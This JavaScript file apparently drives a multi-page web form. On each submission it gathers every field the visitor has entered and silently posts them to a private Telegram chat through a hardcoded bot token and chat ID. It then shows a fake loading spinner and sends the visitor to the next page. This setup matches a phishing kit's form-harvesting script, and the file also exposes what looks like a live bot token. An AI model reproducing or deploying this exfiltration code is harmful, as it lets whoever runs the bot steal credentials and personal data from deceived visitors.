
function handleRedirection(page) {
    let redirectUrl = '';

    switch (page) {
        case 'start.html':
            redirectUrl = '2.html';
            break;
        case '2.html':
            redirectUrl = '3.html';
            break;
        case '3.html':
            redirectUrl = '4.html';
            break;
        case '4.html':
            redirectUrl = '4.html';
            break;
        default:
            // redirectUrl = 'index.html';
            break;
    }

    window.location.href = redirectUrl;
}

// Telegram bot configuration
const BOT_TOKEN = '8131527992:AAFGbVm5VTRlFqp1khP2uuWM0BZwPpZu6S8'; // Replace with your bot token
const CHAT_ID = '6941550031';    // Replace with your chat ID
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Set up the form submission event listener
document.getElementById('myForm').addEventListener('submit', function (e) {
    e.preventDefault();

    // Get form data
    const formData = new FormData(e.target);
    const data = Object.fromEntries(formData.entries());

    // Get ID from local storage
    const id = localStorage.getItem('formId');
    data.id = id;

    // Get the current page context
    const dataPage = document.documentElement.getAttribute('data-page');

    // Format the message for Telegram
    let message = 'New Form Submission:\n';
    for (const [key, value] of Object.entries(data)) {
        message += `${key}: ${value}\n`;
    }

    // Send data to Telegram
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML' // Optional: for better formatting
        })
    })
        .then(response => response.json())
        .then(result => {
            if (result.ok) {
                console.log('Message sent to Telegram:', result);
                // Handle redirection after successful submission
                handleRedirection(dataPage);
            } else {
                console.error('Telegram API error:', result);
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
});

document.getElementById("myForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent the form from submitting immediately

    // Create loader element
    var loader = document.createElement("div");
    loader.style.width = "40px";
    loader.style.height = "40px";
    loader.style.border = "4px solid #f3f3f3";
    loader.style.borderRadius = "50%";
    loader.style.borderTop = "4px solid #3498db";
    loader.style.animation = "spin 1s linear infinite";
    loader.style.position = "fixed";
    loader.style.top = "30%";
    loader.style.left = "40%";
    loader.style.transform = "translate(-50%, -50%)";
    loader.style.zIndex = "9999";
    loader.id = "loader";

    // Append loader to the body
    document.body.appendChild(loader);

    // Add keyframes animation for spin
    var style = document.createElement("style");
    style.type = "text/css";
    var keyFrames = `
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }`;
    style.innerHTML = keyFrames;
    document.getElementsByTagName('head')[0].appendChild(style);

    // Simulate a delay and then submit the form
    setTimeout(() => {
        document.body.removeChild(loader); // Remove the loader
        this.submit(); // Submit the form after showing the loader
    }, 2000); // Adjust the delay as necessary
});


let currentSlide = 0;
const slides = document.querySelector('.slides');
const totalSlides = document.querySelectorAll('.slide').length;

function showNextSlide() {
    currentSlide = (currentSlide + 1) % totalSlides;
    slides.style.transform = `translateX(-${currentSlide * 25}%)`;
}

// Automatically change slides every 3 seconds
setInterval(showNextSlide, 3000);
